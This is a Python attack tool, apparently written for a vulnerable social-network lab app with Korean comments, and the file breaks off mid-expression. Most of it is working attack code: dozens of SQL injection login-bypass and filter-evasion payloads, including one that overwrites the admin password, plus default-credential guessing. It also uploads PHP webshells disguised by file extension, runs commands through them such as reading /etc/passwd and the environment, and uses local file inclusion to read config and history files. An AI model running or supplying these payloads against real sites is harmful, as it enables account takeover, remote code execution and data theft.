import requests
from bs4 import BeautifulSoup
from urllib.parse import quote
import time
import json
import re
from datetime import datetime


class VulnerableSNSAttacker:
    def __init__(self, base_url, attacker_server):
        self.base_url = base_url.rstrip('/')  ## / 두 개 생기는거 방지하는
        self.attacker_server = attacker_server.rstrip('/')
        self.session = requests.Session()  # 쿠키를 자동으로 저장해주는 친구임
        self.session.max_redirects = 50
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })  # 일반적으로 하면 봇으로 생각해서 차단을 맥여가지고 사람인 척하는 것 ###매우매우매우매우매우 중요
        self.vulnerabilities = {
            'sql_injection': [],
            'xss': [],
            'csrf': [],
            'lfi': [],
            'file_upload': []
        }
        self.logged_in = False
        self.current_points = 0
        self.attacker_user_id = None
        self.uploaded_webshell = None
        self.start_time = datetime.now()
        self.attack_timeline = []

    def log_event(self, event_type, description, severity="INFO", details=None):
        """공격 타임라인 로깅"""
        event = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'type': event_type,
            'description': description,
            'severity': severity,
            'details': details or {}
        }
        self.attack_timeline.append(event)

    def print_section(self, title):
        print("\n" + "=" * 60)
        print(f"{title}")
        print("=" * 60)

    def get_attacker_user_id(self):
        """공격자의 user_id 확인"""
        try:
            response = self.session.get(f"{self.base_url}/profile.php")
            soup = BeautifulSoup(response.text, 'html.parser')

            user_id_input = soup.find('input', {'name': 'user_id'})
            if user_id_input:
                self.attacker_user_id = user_id_input.get('value')
                print(f"[*] Attacker User ID: {self.attacker_user_id}")
                return self.attacker_user_id

            profile_link = soup.find('a', href=re.compile(r'profile\.php\?user='))
            if profile_link:
                match = re.search(r'user=(\d+)', profile_link['href'])
                if match:
                    self.attacker_user_id = match.group(1)
                    print(f"[*] Attacker User ID: {self.attacker_user_id}")
                    return self.attacker_user_id

            if 'user_id' in self.session.cookies:
                self.attacker_user_id = self.session.cookies['user_id']
                print(f"[*] Attacker User ID from cookie: {self.attacker_user_id}")
                return self.attacker_user_id

            response = self.session.get(f"{self.base_url}/index.php")
            match = re.search(r'user_id\s*=\s*(\d+)', response.text)
            if match:
                self.attacker_user_id = match.group(1)
                print(f"[*] Attacker User ID from page: {self.attacker_user_id}")
                return self.attacker_user_id

        except Exception as e:
            print(f"[-] Error getting user ID: {e}")

        self.attacker_user_id = "1"
        print(f"[*] Using default User ID: {self.attacker_user_id}")
        return self.attacker_user_id

    def test_sql_injection_login(self):
        """고급 SQL Injection - 다양한 우회 기법"""
        self.print_section("Advanced SQL Injection - Defense Bypass")

        login_url = f"{self.base_url}/login.php"

        print("[*] Testing advanced SQL Injection payloads to bypass security filters...")

        # 고급 SQL Injection 페이로드들
        advanced_payloads = [
            # 기본 우회
            ("admin", '" or "1"="1" --', 'Basic double quote OR bypass'),
            ("admin", "' or '1'='1' --", 'Basic single quote OR bypass'),
            ("admin", '" or 1=1 --', 'Numeric OR bypass'),

            # WAF/필터 우회 기법
            ("admin", "' or 1=1#", 'Hash comment bypass'),
            ("admin", "' or 1=1/*", 'Block comment bypass'),
            ("admin'/**/or/**/1=1--", "any", 'Comment space bypass'),
            ("admin'||'1'='1'--", "any", 'Concatenation bypass'),

            # 대소문자 변형
            ("AdMiN'/**/Or/**/1=1--", "any", 'Case variation bypass'),
            ("ADMIN'/**/OR/**/1=1--", "any", 'Uppercase bypass'),
            ("admin'/**/oR/**/1=1--", "any", 'Mixed case bypass'),

            # 인코딩 우회
            ("admin' %6Fr 1=1--", "any", 'URL encoding bypass'),
            ("admin'/*%2A*/or/*%2A*/1=1--", "any", 'Encoded comment bypass'),
            ("admin\\'/**/or/**/1=1--", "any", 'Backslash escape bypass'),

            # Union 기반
            ("admin' UNION SELECT 1,'admin','password'--", "any", 'Basic UNION bypass'),
            ("admin'/**/UNION/**/SELECT/**/1,'admin','password'--", "any", 'Comment UNION bypass'),
            ("admin'+UNION+SELECT+1,'admin','password'--", "any", 'Plus UNION bypass'),

            # Boolean 기반
            ("admin' AND 1=1--", "any", 'Boolean AND true'),
            ("admin' AND 1=2--", "any", 'Boolean AND false'),
            ("admin' OR 'a'='a'--", "any", 'Boolean OR true'),

            # Time-based Blind
            ("admin' AND (SELECT SLEEP(5))--", "any", 'MySQL time delay'),
            ("admin'; WAITFOR DELAY '00:00:05'--", "any", 'MSSQL time delay'),
            ("admin' AND (SELECT pg_sleep(5))--", "any", 'PostgreSQL time delay'),

            # Error-based
            ("admin' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--", "any", 'EXTRACTVALUE error'),
            ("admin' AND (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--",
             "any", 'Double query error'),
            ("admin' AND UPDATEXML(1,CONCAT(0x7e,USER(),0x7e),1)--", "any", 'UPDATEXML error'),

            # 더블 쿼리
            ("admin' UNION SELECT 1,2,3,4,5--", "any", 'Column number discovery'),
            ("admin' UNION SELECT NULL,NULL,NULL--", "any", 'NULL UNION bypass'),

            # 스택 쿼리
            ("admin'; INSERT INTO users VALUES('hacker','hacked')--", "any", 'Stacked query injection'),
            ("admin'; UPDATE users SET password='hacked' WHERE username='admin'--", "any", 'Update injection'),

            # 서브쿼리
            ("admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--", "any",
             'Substring enumeration'),
            ("admin' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64--", "any",
             'ASCII enumeration'),

            # 필터 우회 - 키워드 분할
            ("admin' AND 'un'||'ion'='union'--", "any", 'Keyword concatenation'),
            ("admin' /*!50000AND*/ 1=1--", "any", 'Version comment bypass'),
            ("admin' %41ND 1=1--", "any", 'Hex encoding bypass'),

            # NoSQL 스타일 (만약 NoSQL이면)
            ("admin", "' || '1'=='1", 'NoSQL OR bypass'),
            ("admin", "' && '1'=='1", 'NoSQL AND bypass'),

            # 2차 SQL Injection
            ("admin'+(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')+'", "any", 'MSSQL table enumeration'),
            ("admin'+(SELECT table_name FROM information_schema.tables LIMIT 1)+'", "any", 'MySQL table enumeration'),
        ]

        print(f"[*] Testing {len(advanced_payloads)} advanced payloads...")

        for username, password, desc in advanced_payloads:
            try:
                print(f"\n[*] Trying: {desc}")
                print(f"    Username: {username}")
                print(f"    Password: {password}")

                start_time = time.time()
                data = {'username': username, 'password': password}

                # 리다이렉트 루프 방지
                response = self.session.post(login_url, data=data, allow_redirects=False, timeout=15)
                end_time = time.time()

                response_time = end_time - start_time
                print(f"    Response: {response.status_code} ({response_time:.2f}s)")

                # 302 리다이렉트는 성공 신호
                if response.status_code == 302:
                    location = response.headers.get('Location', '')
                    print(f"    Redirect to: {location}")

                    if ('index' in location or 'dashboard' in location or
                            'home' in location or '/www/' in location or location == '/'):

                        print(f"[+] SUCCESS! Login redirect detected")

                        # 리다이렉트 따라가기
                        # URL 처리 개선
                        if location.startswith('http'):
                            # 이미 완전한 URL
                            follow_url = location
                        elif location.startswith('/'):
                            # 절대 경로
                            follow_url = self.base_url + location
                        else:
                            # 상대 경로 - base_url에서 /login.php 부분 제거하고 location 추가
                            base_without_login = self.base_url.replace('/login.php', '')
                            follow_url = f"{base_without_login}/{location}"

                        print(f"    Following redirect to: {follow_url}")

                        try:
                            follow_response = self.session.get(follow_url, timeout=10)
                            print(f"    Final status: {follow_response.status_code}")

                            # 로그인 확인
                            if (follow_response.status_code == 200 and
                                    ('logout' in follow_response.text.lower() or
                                     'welcome' in follow_response.text.lower() or
                                     'points' in follow_response.text.lower() or
                                     'profile' in follow_response.text.lower())):

                                print(f"[+] Confirmed successful login!")

                                # 포인트 찾기
                                soup = BeautifulSoup(follow_response.text, 'html.parser')
                                points_text = soup.find(text=re.compile(r'\d+\s*P'))
                                if points_text:
                                    points_match = re.search(r'(\d+)\s*P', points_text)
                                    if points_match:
                                        self.current_points = int(points_match.group(1))
                                        print(f"    Current Points: {self.current_points}P")

                                self.logged_in = True
                                self.get_attacker_user_id()

                                vuln_info = {
                                    'url': login_url,
                                    'username': username,
                                    'password': password,
                                    'description': desc,
                                    'response_time': response_time,
                                    'bypass_method': 'Advanced SQL Injection',
                                    'redirect_location': location,
                                    'final_url': follow_url,
                                    'impact': 'CRITICAL - Authentication bypass via advanced SQLi',
                                    'cvss_score': 9.8
                                }
                                self.vulnerabilities['sql_injection'].append(vuln_info)

                                self.log_event(
                                    'ADVANCED_SQL_INJECTION',
                                    f'Successfully bypassed authentication using: {desc}',
                                    'CRITICAL',
                                    {
                                        'payload': f"username={username}, password={password}",
                                        'method': desc,
                                        'bypass_technique': 'Advanced SQL Injection',
                                        'response_time': response_time,
                                        'points': self.current_points
                                    }
                                )

                                return True
                            else:
                                print(f"    [-] Login not confirmed in follow-up page")

                        except Exception as e:
                            print(f"    [-] Error following redirect: {str(e)[:50]}")

                            # 대안: 직접 메인 페이지들 확인
                            main_urls = [
                                f"{self.base_url.replace('/login.php', '')}/index.php",
                                f"{self.base_url.replace('/login.php', '')}/",
                                f"{self.base_url.replace('/login.php', '')}"
                            ]

                            for main_url in main_urls:
                                try:
                                    print(f"    Trying direct access to: {main_url}")
                                    main_response = self.session.get(main_url, timeout=5)

                                    if (main_response.status_code == 200 and
                                            ('logout' in main_response.text.lower() or
                                             'welcome' in main_response.text.lower() or
                                             'points' in main_response.text.lower())):

                                        print(f"[+] SUCCESS! Direct access confirmed login")
                                        self.logged_in = True
                                        self.get_attacker_user_id()

                                        # 포인트 찾기
                                        soup = BeautifulSoup(main_response.text, 'html.parser')
                                        points_text = soup.find(text=re.compile(r'\d+\s*P'))
                                        if points_text:
                                            points_match = re.search(r'(\d+)\s*P', points_text)
                                            if points_match:
                                                self.current_points = int(points_match.group(1))
                                                print(f"    Current Points: {self.current_points}P")

                                        vuln_info = {
                                            'url': login_url,
                                            'username': username,
                                            'password': password,
                                            'description': desc,
                                            'response_time': response_time,
                                            'access_method': 'Direct main page access',
                                            'main_url': main_url,
                                            'impact': 'CRITICAL - Authentication bypass via SQL injection',
                                            'cvss_score': 9.8
                                        }
                                        self.vulnerabilities['sql_injection'].append(vuln_info)

                                        return True

                                except Exception as e2:
                                    continue

                        # 로그인 확인
                        if ('logout' in follow_response.text.lower() or
                                'welcome' in follow_response.text.lower() or
                                'points' in follow_response.text.lower()):

                            print(f"[+] Confirmed successful login!")

                            soup = BeautifulSoup(follow_response.text, 'html.parser')
                            points_text = soup.find(text=re.compile(r'\d+\s*P'))
                            if points_text:
                                points_match = re.search(r'(\d+)\s*P', points_text)
                                if points_match:
                                    self.current_points = int(points_match.group(1))
                                    print(f"    Current Points: {self.current_points}P")

                            self.logged_in = True
                            self.get_attacker_user_id()

                            vuln_info = {
                                'url': login_url,
                                'username': username,
                                'password': password,
                                'description': desc,
                                'response_time': response_time,
                                'bypass_method': 'Advanced SQL Injection',
                                'impact': 'CRITICAL - Authentication bypass via advanced SQLi',
                                'cvss_score': 9.8
                            }
                            self.vulnerabilities['sql_injection'].append(vuln_info)

                            self.log_event(
                                'ADVANCED_SQL_INJECTION',
                                f'Successfully bypassed authentication using: {desc}',
                                'CRITICAL',
                                {
                                    'payload': f"username={username}, password={password}",
                                    'method': desc,
                                    'bypass_technique': 'Advanced SQL Injection',
                                    'response_time': response_time,
                                    'points': self.current_points
                                }
                            )

                            return True

                # 일반 200 응답도 체크
                elif response.status_code == 200:
                    follow_response = self.session.get(login_url, allow_redirects=True)

                    if ('index.php' in follow_response.url or
                            follow_response.url.endswith('/www/') or
                            'logout' in follow_response.text.lower()):
                        print(f"[+] SUCCESS! Direct login detected")
                        self.logged_in = True
                        self.get_attacker_user_id()

                        vuln_info = {
                            'url': login_url,
                            'username': username,
                            'password': password,
                            'description': desc,
                            'response_time': response_time,
                            'impact': 'CRITICAL - Authentication bypass',
                            'cvss_score': 9.8
                        }
                        self.vulnerabilities['sql_injection'].append(vuln_info)
                        return True

                # Time-based 탐지
                if response_time > 4 and ('SLEEP' in username or 'WAITFOR' in username or 'pg_sleep' in username):
                    print(f"[+] Time-based SQL injection detected! ({response_time:.2f}s)")
                    print(f"    Blind SQLi vulnerability confirmed")

                    vuln_info = {
                        'url': login_url,
                        'username': username,
                        'password': password,
                        'description': f"{desc} (Time-based blind confirmed)",
                        'response_time': response_time,
                        'impact': 'HIGH - Blind SQL injection vulnerability',
                        'cvss_score': 8.5
                    }
                    self.vulnerabilities['sql_injection'].append(vuln_info)

                # Error-based 탐지 (응답 본문 확인)
                try:
                    response_text = response.text if hasattr(response, 'text') else ''
                    error_patterns = [
                        'mysql', 'sql syntax', 'ora-', 'postgresql', 'sqlite', 'mssql',
                        'warning:', 'error in your sql', 'mysql_fetch', 'num_rows',
                        'duplicate entry', 'table', 'column', 'database', 'query failed',
                        'odbc', 'jdbc', 'unexpected end of sql command'
                    ]

                    found_errors = [error for error in error_patterns if error in response_text.lower()]

                    if found_errors:
                        print(f"[+] Error-based SQL injection detected!")
                        print(f"    Database errors: {', '.join(found_errors[:3])}")

                        vuln_info = {
                            'url': login_url,
                            'username': username,
                            'password': password,
                            'description': f"{desc} (Error-based confirmed)",
                            'errors_found': found_errors,
                            'impact': 'HIGH - Database information disclosure via errors',
                            'cvss_score': 8.0
                        }
                        self.vulnerabilities['sql_injection'].append(vuln_info)

                except:
                    pass

                # Boolean-based 탐지 (응답 길이 차이)
                if 'AND 1=1' in username or 'AND 1=2' in username:
                    # 참/거짓 쿼리 비교를 위한 기준점 설정
                    if not hasattr(self, '_baseline_response_length'):
                        self._baseline_response_length = len(response_text) if 'response_text' in locals() else 0

                    current_length = len(response_text) if 'response_text' in locals() else 0
                    if abs(current_length - self._baseline_response_length) > 100:
                        print(f"[+] Boolean-based SQL injection suspected!")
                        print(f"    Response length difference detected")

                        vuln_info = {
                            'url': login_url,
                            'username': username,
                            'password': password,
                            'description': f"{desc} (Boolean-based suspected)",
                            'response_length_diff': abs(current_length - self._baseline_response_length),
                            'impact': 'MEDIUM - Possible Boolean-based blind SQLi',
                            'cvss_score': 6.5
                        }
                        self.vulnerabilities['sql_injection'].append(vuln_info)

                print(f"    [-] No injection detected")

            except requests.exceptions.Timeout:
                print(f"[+] Request timeout - possible DoS or time-based injection")

                vuln_info = {
                    'url': login_url,
                    'username': username,
                    'password': password,
                    'description': f"{desc} (Timeout-based)",
                    'impact': 'MEDIUM - Possible time-based SQLi or DoS',
                    'cvss_score': 6.0
                }
                self.vulnerabilities['sql_injection'].append(vuln_info)

            except Exception as e:
                if 'redirect' in str(e).lower():
                    print(f"[+] Redirect loop detected - possible successful injection!")

                    # 직접 메인 페이지 확인
                    try:
                        main_check = self.session.get(f"{self.base_url}/index.php", timeout=5)
                        if ('logout' in main_check.text.lower() or
                                'welcome' in main_check.text.lower() or
                                'points' in main_check.text.lower()):
                            print(f"[+] SUCCESS! Confirmed via main page access")
                            self.logged_in = True
                            self.get_attacker_user_id()

                            vuln_info = {
                                'url': login_url,
                                'username': username,
                                'password': password,
                                'description': f"{desc} (via redirect loop)",
                                'impact': 'CRITICAL - Authentication bypass',
                                'cvss_score': 9.8
                            }
                            self.vulnerabilities['sql_injection'].append(vuln_info)
                            return True
                    except:
                        pass
                else:
                    print(f"    [-] Error: {str(e)[:50]}")

        # 로그인에 실패했어도 발견된 SQL Injection 취약점이 있으면 보고
        if self.vulnerabilities['sql_injection']:
            print(f"\n[+] Found {len(self.vulnerabilities['sql_injection'])} SQL injection vulnerabilities!")
            print("[*] Even though login bypass failed, the system is vulnerable to SQLi")

        # 기본 크리덴셜 시도 (더 많은 조합)
        print("\n[*] Trying extensive default credentials...")
        default_creds = [
            ("admin", "admin123"),
            ("alice", "alice2024"),
            ("bob", "bobby123"),
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("admin", ""),  # 빈 패스워드
            ("", ""),  # 빈 사용자명, 빈 패스워드
            ("root", "root"),
            ("test", "test"),
            ("user", "user"),
            ("guest", "guest"),
            ("demo", "demo"),
            ("administrator", "admin"),
            ("user1", "password1"),
            ("admin", "qwerty"),
            ("admin", "letmein"),
        ]

        for username, password in default_creds:
            try:
                print(f"[*] Trying: {username}/{password}")
                data = {'username': username, 'password': password}
                response = self.session.post(login_url, data=data, allow_redirects=True, timeout=10)

                if ('index.php' in response.url or response.url.endswith('/www/') or
                        response.url.endswith('/www') or 'logout' in response.text.lower()):

                    print(f"[+] SUCCESS with default credentials!")
                    self.logged_in = True

                    soup = BeautifulSoup(response.text, 'html.parser')
                    points_text = soup.find(text=re.compile(r'\d+\s*P'))
                    if points_text:
                        points_match = re.search(r'(\d+)\s*P', points_text)
                        if points_match:
                            self.current_points = int(points_match.group(1))
                            print(f"    Current Points: {self.current_points}P")

                    self.get_attacker_user_id()

                    vuln_info = {
                        'url': login_url,
                        'credentials': f"{username}/{password}",
                        'description': 'Weak default credentials',
                        'impact': 'HIGH - Authentication bypass via weak credentials',
                        'cvss_score': 7.5
                    }
                    self.vulnerabilities['sql_injection'].append(vuln_info)

                    self.log_event(
                        'WEAK_CREDENTIALS',
                        f'Logged in with default credentials: {username}/{password}',
                        'HIGH',
                        {'username': username, 'password': password}
                    )

                    return True
            except:
                continue

        # 회원가입 시도
        print("\n[*] Attempting user registration...")
        try:
            register_url = f"{self.base_url}/register.php"
            import random
            random_id = random.randint(1000, 9999)

            signup_data = {
                'username': f'testuser{random_id}',
                'password': 'password123',
                'email': f'test{random_id}@test.com',
                'full_name': f'Test User {random_id}',
                'confirm_password': 'password123'
            }

            reg_response = self.session.post(register_url, data=signup_data, timeout=10)

            if ('success' in reg_response.text.lower() or
                    'registered' in reg_response.text.lower() or
                    'created' in reg_response.text.lower()):

                print(f"[+] Registration successful! Attempting login...")

                login_data = {
                    'username': signup_data['username'],
                    'password': signup_data['password']
                }
                login_response = self.session.post(login_url, data=login_data, allow_redirects=True)

                if ('index.php' in login_response.url or
                        login_response.url.endswith('/www/')):
                    print(f"[+] SUCCESS! Logged in with new account")
                    self.logged_in = True
                    self.get_attacker_user_id()

                    self.log_event(
                        'USER_REGISTRATION',
                        f'Created and logged in with new account: {signup_data["username"]}',
                        'INFO'
                    )

                    return True

        except Exception as e:
            print(f"[-] Registration failed: {str(e)[:50]}")

        return False

    def test_file_upload_rce(self):
        """File Upload - 웹쉘 업로드"""
        self.print_section("File Upload - Webshell Upload")

        if not self.logged_in:
            print("[-] Login required")
            return False

        # URL 수정 - 올바른 base_url 사용
        base_domain = self.base_url.replace('/login.php', '')
        upload_url = f"{base_domain}/upload.php"
        file_url = f"{base_domain}/file.php"

        print(f"[*] Upload URL: {upload_url}")
        print(f"[*] File URL: {file_url}")

        webshell_payloads = [
            b'<?=`$_GET[0]`?>',
            b'<?php echo shell_exec($_GET["cmd"]); ?>',
            b'<?php system($_GET["cmd"]); ?>',
            b'<?php passthru($_GET["cmd"]); ?>',
            b'<?php echo `$_GET["cmd"]`; ?>',
            b'<?=system($_GET[c]);?>',
            b'<?php echo exec($_GET["cmd"]); ?>',
            b'<?php if(isset($_GET["cmd"])){echo "<pre>";system($_GET["cmd"]);echo "</pre>";} ?>',
        ]

        test_files = [
            ('shell_E.php', 'Direct PHP upload'),
            ('shell_E.php5', 'PHP5 extension'),
            ('shell_E.phtml', 'PHTML extension'),
            ('shell_E.php3', 'PHP3 extension'),
            ('shell_E.inc', 'Include extension'),
            ('shell_E.txt', 'Text file disguise'),
            ('shell_E.gif', 'Image disguise'),
            ('shell_E.jpg.php', 'Double extension'),
        ]

        print("[*] Uploading webshell (testing multiple payloads and extensions)...")

        # 각 페이로드와 파일 조합을 테스트
        for payload_idx, webshell_code in enumerate(webshell_payloads):  # 이 부분이 중요!
            print(f"\n[*] Testing payload #{payload_idx + 1}: {webshell_code.decode()[:30]}...")

            for filename, desc in test_files:
                try:
                    print(f"\n  [*] Trying: {filename} ({desc})")

                    files = {'file': (filename, webshell_code, 'application/x-php')}

                    # 리다이렉트 방지
                    response = self.session.post(upload_url, files=files, allow_redirects=False, timeout=10)

                    print(f"      Upload response: {response.status_code}")

                    # 302 리다이렉트도 성공으로 간주
                    if response.status_code in [200, 302]:
                        # 응답 내용 확인
                        try:
                            response_text = response.text if hasattr(response, 'text') else ''
                        except:
                            response_text = ''

                        if (response.status_code == 302 or
                                'success' in response_text.lower() or
                                'uploaded' in response_text.lower() or
                                filename in response_text):

                            print(f"      [+] File uploaded successfully")

                            print(f"      [*] Testing webshell execution...")
                            commands = ['whoami', 'id', 'pwd', 'ls']

                            for cmd in commands:
                                try:
                                    params = {'name': filename, 'cmd': cmd}
                                    cmd_response = self.session.get(file_url, params=params,
                                                                    allow_redirects=False, timeout=10)

                                    print(f"          Command '{cmd}' response: {cmd_response.status_code}")

                                    if cmd_response.status_code == 200:
                                        soup = BeautifulSoup(cmd_response.text, 'html.parser')
                                        content_div = soup.find('div', class_='file-content')

                                        if content_div:
                                            output = content_div.get_text(strip=True)
                                        else:
                                            # div가 없으면 전체 텍스트 확인
                                            output = cmd_response.text[:500]

                                        # 실행 성공 지표 확인
                                        execution_indicators = [
                                            'www-data', 'apache', 'nginx', 'root', 'daemon',
                                            '/bin/', '/usr/', '/home/', '/var/', 'uid=', 'gid=',
                                            'total ', '-rw-', 'drwx', 'shell', 'bash'
                                        ]

                                        if (output and '<?php' not in output and
                                                any(indicator in output.lower() for indicator in execution_indicators)):

                                            print(f"\n      [+] WEBSHELL EXECUTION SUCCESS!")
                                            print(f"          Payload: #{payload_idx + 1}")
                                            print(f"          File: {filename}")
                                            print(f"          Command: {cmd}")
                                            print(f"          Output: {output[:150]}...")
                                            print(f"          Access URL: {file_url}?name={filename}&cmd={cmd}")

                                            self.uploaded_webshell = filename

                                            vuln_info = {
                                                'upload_url': upload_url,
                                                'filename': filename,
                                                'payload_index': payload_idx + 1,
                                                'webshell_code': webshell_code.decode(),
                                                'command': cmd,
                                                'output': output[:200],
                                                'access_url': f"{file_url}?name={filename}&cmd={cmd}",
                                                'bypass_method': desc,
                                                'impact': 'CRITICAL - Remote Code Execution achieved',
                                                'cvss_score': 10.0
                                            }
                                            self.vulnerabilities['file_upload'].append(vuln_info)

                                            self.log_event(
                                                'FILE_UPLOAD_RCE',
                                                f'Successfully uploaded webshell: {filename}',
                                                'CRITICAL',
                                                {
                                                    'filename': filename,
                                                    'payload_index': payload_idx + 1,
                                                    'bypass_method': desc,
                                                    'test_command': cmd,
                                                    'output': output[:100]
                                                }
                                            )

                                            return True
                                        else:
                                            print(f"          [-] No command execution detected")
                                            if output:
                                                print(f"              Output preview: {output[:100]}...")

                                except Exception as e:
                                    print(f"          [-] Command execution error: {str(e)[:30]}")
                                    continue
                        else:
                            print(f"      [-] Upload failed or blocked")
                    else:
                        print(f"      [-] Upload failed: HTTP {response.status_code}")

                except Exception as e:
                    print(f"      [-] Upload error: {str(e)[:50]}")

            # 페이로드별로 짧은 대기
            time.sleep(0.1)

        return False

    def test_lfi(self):
        """LFI - Local File Inclusion"""
        self.print_section("LFI - Local File Inclusion")

        if not self.logged_in:
            print("[-] Login required")
            return False

        # URL 수정
        base_domain = self.base_url.replace('/login.php', '')
        file_url = f"{base_domain}/file.php"

        print(f"[*] File URL: {file_url}")
        print("[*] Testing LFI payloads...")

        lfi_payloads = [
            # 1. 절대 경로 사용 (성공 예상)
            ("/etc/passwd", "root:", "Absolute path - /etc/passwd"),
            ("/etc/hosts", "localhost", "Absolute path - /etc/hosts"),
            ("/var/www/html/config.php", "<?php", "Absolute path - config.php"),

            # 2. 우회 방법들
            ("../../etc/passwd", "root:", "Relative path - ../../etc/passwd"),
            ("../../../etc/passwd", "root:", "Relative path - ../../../etc/passwd"),

            # 3. 업로드된 웹쉘들 (다양한 확장자)
            ("shell_E.php5", "SUCCESS", "Webshell - shell_E.php5"),
            ("shell_E.phtml", "SUCCESS", "Webshell - shell_E.phtml"),
            ("shell_E.php3", "SUCCESS", "Webshell - shell_E.php3"),
            ("shell_E.inc", "SUCCESS", "Webshell - shell_E.inc"),
            ("shell_E.php", "SUCCESS", "Webshell - shell_E.php"),
            ("shell_E.txt", "SUCCESS", "Webshell - shell_E.txt"),
            ("shell_E.gif", "SUCCESS", "Webshell - shell_E.gif"),
            ("shell_E.jpg.php", "SUCCESS", "Webshell - shell_E.jpg.php"),

            # 4. 민감한 파일들
            ("/var/log/apache2/access.log", "GET", "Apache access log"),
            ("/home/ubuntu/.bash_history", "sudo", "Bash history"),
            ("/proc/version", "Linux", "System version"),
            ("../config.php", "<?php", "Config file"),
        ]

        success_count = 0
        webshell_executed = False

        for payload, indicator, desc in lfi_payloads:
            try:
                print(f"\n[*] Testing: {desc}")
                print(f"    Payload: {payload}")

                # 웹쉘인 경우 명령어 실행 시도
                if "webshell" in desc.lower():
                    print(f"    [*] Attempting webshell execution...")

                    # 다양한 명령어 파라미터와 명령어 조합
                    command_combinations = [
                        # 기본 파라미터들
                        ({'name': payload, 'cmd': 'whoami'}, 'whoami with cmd'),
                        ({'name': payload, 'c': 'whoami'}, 'whoami with c'),
                        ({'name': payload, '0': 'whoami'}, 'whoami with 0'),
                        ({'name': payload, 'x': 'whoami'}, 'whoami with x'),

                        # 다른 명령어들
                        ({'name': payload, 'cmd': 'id'}, 'id command'),
                        ({'name': payload, 'cmd': 'pwd'}, 'pwd command'),
                        ({'name': payload, 'cmd': 'ls -la'}, 'ls command'),
                        ({'name': payload, 'cmd': 'uname -a'}, 'uname command'),
                        ({'name': payload, 'cmd': 'cat /etc/passwd'}, 'cat passwd'),
                        ({'name': payload, 'cmd': 'ps aux'}, 'process list'),

                        # 더 은밀한 파라미터들
                        ({'name': payload, 'exec': 'whoami'}, 'whoami with exec'),
                        ({'name': payload, 'run': 'whoami'}, 'whoami with run'),
                        ({'name': payload, 'shell': 'whoami'}, 'whoami with shell'),
                    ]

                    webshell_success = False

                    for params, cmd_desc in command_combinations:
                        try:
                            response = self.session.get(file_url, params=params,
                                                        allow_redirects=False, timeout=10)

                            print(f"        Testing {cmd_desc}: {response.status_code}")

                            if response.status_code == 200:
                                # BeautifulSoup으로 파싱
                                soup = BeautifulSoup(response.text, 'html.parser')
                                content_div = soup.find('div', class_='file-content')

                                if content_div:
                                    output = content_div.get_text(strip=True)
                                else:
                                    output = response.text

                                # 웹쉘 실행 성공 지표들 (확장)
                                execution_indicators = [
                                    'www-data', 'apache', 'nginx', 'root', 'daemon', 'nobody',
                                    'uid=', 'gid=', 'groups=',
                                    '/bin/', '/usr/', '/home/', '/var/', '/etc/', '/opt/',
                                    'total ', '-rw-', 'drwx', '-rwx', 'lrwxr',
                                    'Linux', 'Ubuntu', 'Debian', 'CentOS', 'GNU',
                                    'index.php', 'config.php', 'login.php', 'upload.php',
                                    'PID', 'PPID', 'COMMAND', 'bash', 'sh', 'zsh',
                                    'processor', 'cpu', 'memory', 'kernel'
                                ]

                                # PHP 코드가 실행되지 않고 그대로 출력되는지 확인
                                php_code_patterns = ['<?php', '<?=', 'system(', '_GET[', '$_GET', 'passthru',
                                                     'shell_exec']
                                has_php_code = any(pattern in output for pattern in php_code_patterns)

                                # 실행 성공 여부 확인
                                found_indicators = [ind for ind in execution_indicators if
                                                    ind.lower() in output.lower()]

                                if output and not has_php_code and found_indicators and len(output.strip()) > 3:
                                    print(f"\n        [+] WEBSHELL EXECUTION SUCCESS!")
                                    print(f"            File: {payload}")
                                    print(f"            Command: {cmd_desc}")
                                    print(f"            Found indicators: {found_indicators}")
                                    print(f"            Output length: {len(output)} chars")
                                    print(f"            Output preview: {output[:200]}...")
                                    print(f"            Full URL: {file_url}?{self.dict_to_query_string(params)}")

                                    webshell_executed = True
                                    webshell_success = True
                                    success_count += 1

                                    # 성공한 웹쉘 정보 저장
                                    self.uploaded_webshell = payload

                                    vuln_info = {
                                        'type': 'LFI + Webshell Execution (RCE)',
                                        'url': file_url,
                                        'payload': payload,
                                        'command_params': params,
                                        'command_description': cmd_desc,
                                        'description': desc,
                                        'indicators_found': found_indicators,
                                        'output': output[:500],
                                        'output_length': len(output),
                                        'access_url': f"{file_url}?{self.dict_to_query_string(params)}",
                                        'impact': 'CRITICAL - Remote Code Execution via LFI + uploaded webshell',
                                        'cvss_score': 10.0
                                    }
                                    self.vulnerabilities['lfi'].append(vuln_info)

                                    self.log_event(
                                        'LFI_WEBSHELL_RCE',
                                        f'Successfully executed commands via LFI webshell: {payload}',
                                        'CRITICAL',
                                        {
                                            'webshell_file': payload,
                                            'command': cmd_desc,
                                            'execution_method': 'LFI + File Upload combination',
                                            'access_url': f"{file_url}?{self.dict_to_query_string(params)}",
                                            'output_preview': output[:100]
                                        }
                                    )

                                    # 추가 명령어들 자동 실행
                                    print(f"\n        [*] Testing additional commands with successful webshell...")
                                    additional_commands = [
                                        'cat /proc/version',
                                        'ps aux | head -10',
                                        'netstat -tulnp | head -5',
                                        'find /var/www -name "*.php" | head -5',
                                        'cat /etc/passwd | head -5',
                                        'env | head -10',
                                        'df -h',
                                        'whoami; id; pwd',
                                        'ls -la /var/www/html',
                                        'cat /var/log/apache2/error.log | tail -3 2>/dev/null || echo "No access"'
                                    ]

                                    # 성공한 파라미터 키 찾기
                                    cmd_key = [k for k in params.keys() if k != 'name'][0]

                                    for add_cmd in additional_commands:
                                        try:
                                            add_params = {'name': payload, cmd_key: add_cmd}
                                            add_response = self.session.get(file_url, params=add_params, timeout=8)

                                            if add_response.status_code == 200:
                                                add_soup = BeautifulSoup(add_response.text, 'html.parser')
                                                add_content = add_soup.find('div', class_='file-content')
                                                add_output = add_content.get_text(
                                                    strip=True) if add_content else add_response.text

                                                # 의미있는 출력이 있는지 확인
                                                if (add_output and len(add_output.strip()) > 5 and
                                                        not any(
